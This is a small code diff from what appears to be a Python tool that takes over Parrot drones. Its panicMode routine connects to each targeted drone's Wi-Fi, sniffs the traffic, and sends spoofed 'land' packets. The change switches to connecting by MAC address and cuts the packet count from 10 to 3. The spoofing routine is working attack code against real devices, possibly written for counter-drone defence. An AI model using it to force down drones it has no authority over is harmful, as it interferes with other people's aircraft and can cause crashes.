@@ -97,12 +97,12 @@ def panicMode():
 	global underattack, attackInProgress
 	while len(underattack) > 0:
 		current = underattack.pop(0) #get the first parrot
-		if not connectTo(current, interfaceToConnect):
+		if not connectToByMAC(current, interfaceToConnect):
 			continue #skip if unable to connect
 		srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)
 		if srcMAC == "":
 			continue #skip if sniffing timeouts
-		sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10) #send 10 land packet
+		sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 3) #send 3 land packet
 	attackInProgress = 0
 	disconnectFromWifi(interfaceToConnect)
 
